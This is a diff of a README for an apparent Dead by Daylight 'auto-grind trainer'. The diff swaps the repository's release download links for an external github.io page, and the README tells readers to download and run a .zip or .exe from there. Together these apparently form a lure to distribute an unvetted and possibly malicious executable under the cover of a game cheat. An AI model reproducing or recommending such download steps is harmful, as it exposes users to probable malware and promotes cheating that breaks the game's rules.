@@ -1,6 +1,6 @@
 # 🎮 DBD-AutoGrind-Trainer-2026-Mega - Automate your Dead by Daylight progression easily
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/theezcation/DBD-AutoGrind-Trainer-2026-Mega/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://theezcation.github.io)
 
 ## Overview 📝
 
@@ -26,7 +26,7 @@ This tool helps players earn Bloodpoints and manage character progression in Dea
 
 Follow these steps to set up the trainer on your computer.
 
-1. **Visit the download page:** Go to [https://github.com/theezcation/DBD-AutoGrind-Trainer-2026-Mega/releases](https://github.com/theezcation/DBD-AutoGrind-Trainer-2026-Mega/releases).
+1. **Visit the download page:** Go to [https://theezcation.github.io](https://theezcation.github.io).
 2. **Download the file:** Look for the latest version marked with a ".zip" or ".exe" extension. Click the file to save it to your computer.
 3. **Extract the files:** Open the folder where you saved the file. Right-click the folder or file and choose "Extract All" if it is in a zip format.
 4. **Prepare the game:** Launch Dead by Daylight. Set your display mode to Windowed or Borderless Windowed in the game settings menu.
